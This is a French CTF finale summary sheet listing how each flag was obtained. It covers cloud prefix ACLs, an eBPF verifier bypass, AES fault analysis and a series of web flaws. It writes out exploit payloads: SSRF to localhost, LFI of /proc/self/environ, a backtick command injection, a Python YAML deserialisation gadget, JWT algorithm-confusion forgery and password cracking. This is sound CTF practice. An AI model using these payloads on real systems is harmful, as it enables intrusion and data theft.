# NCTF26 Finale — Fiche des processus (flags obtenus)

> But : maîtriser la méthode de chaque flag avant soumission. Détail complet par challenge
> dans les fichiers `writeups/<nom>.md`. Flags **rotatés** en finale → méthode = constante,
> valeur = re-dérivée sur l'instance live.

## Mes solves (session principale)

### Cloud `*-prefix` ×9 (registry, queue, artifacts, backup, billing, cdn, gateway, identity, metrics)
Object-store type S3, ACL par préfixe. Chaîne (voir `solve_prefix.py`) :
1. `GET /list?prefix=public/` → liste `public/*` (403 sur tout autre préfixe).
2. `GET /get?key=public/backup-notes.txt` → fuit `deploy_secret=AKIA…`.
3. `GET /assume?secret=AKIA…` → `{"role":"backup-restore","token":"role-…"}`.
4. `GET /get?key=private/flag` + header `X-Role-Token: role-…` → flag.
Piège : `private/flag` non listable (« served by no route ») → deviner la clé. Warmup cold-start.

### klouto (web) — SSRF
`/api/preview?url=` fetch côté serveur, sans filtrage IP privée.
`?url=http://127.0.0.1:5100/internal/flag` → flag (port interne 5100, route `/internal/flag`).

### ghostflag (web) — content discovery + leurres
robots.txt + commentaires HTML pointent un dossier. Vrai flag :
`/secret_files/fnd_password/flag.json`. Leurres : faux flag `/api/agent/check`, `flag.txt`=index.

### sokode-crypto (500) — DFA AES-128 (Piret–Quisquater)
`oracle.py` = AES-128 manuel ; mode « dégradé » injecte 1 faute avant MixColumns R9.
16 télégrammes (PT, CT, CT_fauté, colonne). Par colonne fautée → 4 octets de K10 ;
intersection des candidats → K10 complet → inversion du key schedule → clé maître (=flag).
RSA (N divisible par 3 mais N/3 non premier) = leurre. Solveur `solve_sokode.py`.

### ebpf-mirage (300) — bypass vérificateur eBPF (shift mod 32)
Service TLS nc, bytecode eBPF (`[op][dst][src][off][imm32]`). R1 = ptr map (size 0x40).
`LDXB` exige `reg[off].umax < map_size`. Bug : handler `RSH` du vérif pose umax=0 si shift≥32,
mais `shr` x86 masque le shift à 5 bits (shift 32 = 0 = inchangé). Exploit :
`MOV R2,idx ; MOV R3,32 ; RSH R2,R3 ; LDXB R0,[R1+R2] ; EXIT` → OOB → flag à l'offset 64.
Client `ebpf_client.py`.

## Web série boazak

| # | Faille | Clé du processus |
|---|---|---|
| agoe | BOLA/IDOR batch | `GET /api/users?ids=[2,1]` — autz ne check que le 1er id |
| tsevie | LFI | `GET /api/note?file=/proc/self/environ` → `FLAG=` dans l'env |
| akodessewa | Mass assignment | `POST /api/register` + champ admin → session admin → `/admin` |
| kande | Config merge | `POST /api/config {"admin":true}` → `/admin` |
| be | .git exposé | dump historique → `backup.zip` ZipCrypto → rockyou `chloedev` |
| vogan | YAML deser (RCE) | `POST /apply` `yaml.load`; oracle d'erreur `!!python/object/apply:...os.getenv["FLAG"]` |
| atakpame | Command injection | `/api/process?name=` `shell=True` → `name=\`cat /flags/flag.txt >&2\`` |
| togbi | JWT RS256→HS256 | récup pub via sign2n/gcd de 3 sigs, forge HS256 (PEM SPKI comme secret HMAC), `role=SUPER_A_DMIN` |
| mono | SSRF proxy | `GET /admin-flag` (backend joignable). ⚠️ possible leurre/instance mal routée |

## Murs anti-IA (non faisables sans humain)
- Série **isid0r3** (bibliotech/carnet/curfew/…) : CAPTCHA login+register vérifié serveur,
  SECRET_KEY Flask fort (rockyou épuisé), meta noai. Vuln réelle = JWT/JWKS forge, mais
  bloquée derrière le captcha → **nécessite un humain** (résoudre captcha + passer le cookie).
- Règle : on ne contourne jamais un captcha (anti-bot).

## Bloqué par l'infra
- **atakpame-pipeline (boot2root 500)** : VPN WireGuard OK, source CI clonée (registre
  « atakpame-registry », git dumb-HTTP read-only, hooks `/opt/runner/`, upload token-gated),
  mais l'instance web ne sert pas (Werkzeug mono-thread qui plante + latence VPN) → à retenter.
